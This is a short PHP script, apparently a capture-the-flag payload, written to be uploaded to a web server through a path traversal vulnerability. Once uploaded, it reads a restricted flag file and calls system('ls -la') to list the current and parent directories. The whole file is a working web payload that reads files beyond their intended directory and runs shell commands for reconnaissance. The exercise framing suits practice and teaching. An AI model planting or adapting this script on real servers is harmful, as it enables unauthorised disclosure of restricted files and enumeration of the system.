<?php
// Simple PHP script to read the flag file
// For educational purposes only

// Location of the flag file
$flag_file = '../restricted/flag.txt';

// Read the flag file
if (file_exists($flag_file)) {
    $flag = file_get_contents($flag_file);
    echo "<h1>Flag Found!</h1>";
    echo "<pre>$flag</pre>";
} else {
    echo "<h1>Flag Not Found</h1>";
    echo "<p>The file $flag_file does not exist or cannot be read.</p>";
}

echo "<hr>";
echo "<h2>File System Information</h2>";
echo "<pre>";
echo "Current working directory: " . getcwd() . "\n";
echo "Files in current directory:\n";
system('ls -la');
echo "\n\nFiles in parent directory:\n";
system('ls -la ..');
echo "</pre>";

// This file should be uploaded to the web server using the path traversal vulnerability
// to read the flag file that would otherwise be inaccessible
?> 